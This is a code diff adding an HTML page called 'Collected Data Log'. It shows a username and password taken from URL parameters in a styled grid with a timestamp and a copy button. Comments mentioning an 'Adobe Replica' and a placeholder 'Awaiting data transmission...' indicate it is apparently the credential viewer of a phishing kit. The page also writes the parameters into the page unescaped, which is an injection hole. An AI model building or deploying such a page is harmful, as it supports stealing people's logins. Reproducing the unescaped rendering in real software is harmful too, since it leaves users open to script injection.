@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Collected Data Log</title>
+    
+    <!-- Using Tailwind for base utilities, but custom CSS will drive the core aesthetic -->
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    
+    <!-- Modern 'Inter' font, a staple of clean, premium design -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS to achieve the precise "Adobe Replica" + "Excel" blend -->
+    <style>
+        /* Base Body Styling: A subtle, clean canvas */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* The main polished container, inspired by modern UI toolkits */
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 900px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        h2 {
+            font-size: 2.25rem;
+            font-weight: 700;
+            color: #1a202c;
+            margin: 0;
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            color: #4a5568;
+            margin: 0;
+        }
+
+        /* --- Excel-like Grid Styling --- */
+
+        /* The container for the entire grid component */
+        .grid-container {
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            overflow: hidden; /* Ensures inner cells conform to the rounded corners */
+            text-align: left;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);
+        }
+
+        /* The CSS Grid layout definition */
+        .grid {
+            display: grid;
+            grid-template-columns: 50px 1fr 1.5fr 1fr; /* # | Date | Username | Password */
+        }
+        
+        /* A base style for ALL cells in the grid */
+        .grid-cell {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #e2e8f0;
+            border-right: 1px solid #e2e8f0;
+            font-size: 0.875rem;
+            transition: background-color 0.15s ease-out;
+            min-height: 48px; /* Consistent row height */
+        }
+        
+        /* Remove the right border on the last cell of each "row" */
+        .grid-cell:nth-child(4n) {
+            border-right: none;
+        }
+        
+        /* Header-specific styling */
+        .grid-header {
+            background-color: #f7fafc;
+            color: #4a5568;
+            font-weight: 600;
+        }
+        
+        /* Styling for the row number column, just like Excel */
+        .grid-row-number {
+            justify-content: center;
+            font-weight: 600;
+            color: #718096;
+            background-color: #f7fafc;
+        }
+
+        /* Styling for the data cells */
+        .grid-data-cell {
+            color: #2d3748;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+        }
+        
+        /* Hover effect on data rows */
+        .data-row:hover .grid-data-cell {
+            background-color: #eff6ff; /* A subtle blue highlight */
+        }
+
+        /* Special cell for the 'No data' message, spanning all columns */
+        .no-data-cell {
+            grid-column: 1 / -1; /* Span from the first grid line to the last */
+            justify-content: center;
+            color: #718096;
+            min-height: 150px;
+        }
+
+        /* --- High-Fidelity Button Styling (from previous prompt) --- */
+        .button-group { display: flex; justify-content: center; gap: 15px; margin-top: 10px; }
+        .action-button { display: inline-flex; align-items: center; justify-content: center; padding: 12px 24px; background-color: #4285f4; color: #ffffff; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
+        .action-button:hover { background-color: #357ae8; transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15); }
+        .action-button:active { transform: translateY(0); box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); }
+        .refresh-button { background-color: #6c757d; }
+        .refresh-button:hover { background-color: #5a6268; }
+        .action-button svg { margin-right: 8px; width: 20px; height: 20px; fill: currentColor; }
+        .action-button.success { background-color: #34a853; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Collected Data Log</h2>
+        <p class="subtitle">Data passed via URL parameters will appear in the grid below.</p>
+
+        <div class="grid-container">
+            <div id="dataGrid" class="grid">
+                <!-- The JavaScript will populate this area -->
+            </div>
+        </div>
+
+        <div class="button-group">
+            <button id="copyButton" class="action-button">
+                <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg>
+                <span>Copy Data</span>
+            </button>
+            <button id="refreshButton" class="action-button refresh-button">
+                <svg viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path></svg>
+                <span>Refresh</span>
+            </button>
+        </div>
+    </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    // --- DOM Element References ---
+    const dataGrid = document.getElementById('dataGrid');
+    const copyButton = document.getElementById('copyButton');
+    const refreshButton = document.getElementById('refreshButton');
+    const originalCopyButtonHTML = copyButton.innerHTML;
+
+    // --- State to hold parsed data for the copy function ---
+    let dataToCopy = null;
+
+    // --- Helper Functions ---
+    const getUrlParams = () => new URLSearchParams(window.location.search);
+    
+    const formatDate = (date) => {
+        const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
+        return new Intl.DateTimeFormat('en-GB', options).format(date);
+    };
+
+    /**
+     * Renders data into the grid. This function now builds the entire grid,
+     * including headers and data rows, dynamically.
+     */
+    const renderDataGrid = () => {
+        const params = getUrlParams();
+        const username = params.get('username');
+        const password = params.get('password');
+
+        // Clear previous grid content
+        dataGrid.innerHTML = ''; 
+
+        // Always render the header row
+        dataGrid.innerHTML += `
+            <div class="grid-cell grid-header grid-row-number">#</div>
+            <div class="grid-cell grid-header">Date & Time</div>
+            <div class="grid-cell grid-header">@username</div>
+            <div class="grid-cell grid-header">password</div>
+        `;
+        
+        if (username && password) {
+            const formattedDate = formatDate(new Date());
+
+            // Prepare the data row HTML
+            const dataRowHTML = `
+                <div class="grid-cell grid-row-number">1</div>
+                <div class="grid-cell grid-data-cell">${formattedDate}</div>
+                <div class="grid-cell grid-data-cell">${username}</div>
+                <div class="grid-cell grid-data-cell">${password}</div>
+            `;
+            // Add a wrapper div to apply the hover effect to the whole row
+            dataGrid.innerHTML += `<div class="contents data-row">${dataRowHTML}</div>`;
+            
+            // Store data for the copy function
+            dataToCopy = `Date: ${formattedDate}\nUsername: ${username}\nPassword: ${password}`;
+
+        } else {
+            // If no data, display the placeholder message
+            dataGrid.innerHTML += `<div class="grid-cell no-data-cell">Awaiting data transmission...</div>`;
+            dataToCopy = null; // No data to copy
+        }
+    };
+    
+    // --- Initial Render ---
+    renderDataGrid();
+
+    // --- Event Listeners ---
+    copyButton.addEventListener('click', async () => {
+        if (!dataToCopy) return;
+
+        try {
+            await navigator.clipboard.writeText(dataToCopy);
+            
+            // Visual feedback for success
+            copyButton.innerHTML = `
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
+                <span>Copied!</span>`;
+            copyButton.classList.add('success');
+            
+            setTimeout(() => {
+                copyButton.innerHTML = originalCopyButtonHTML;
+                copyButton.classList.remove('success');
+            }, 2000);
+
+        } catch (err) {
+            console.error('Failed to copy data: ', err);
+            copyButton.querySelector('span').textContent = 'Copy Failed';
+            setTimeout(() => copyButton.innerHTML = originalCopyButtonHTML, 2000);
+        }
+    });
+
+    refreshButton.addEventListener('click', () => {
+        window.location.reload();
+    });
+});
+</script>
+
+</body>
+</html>
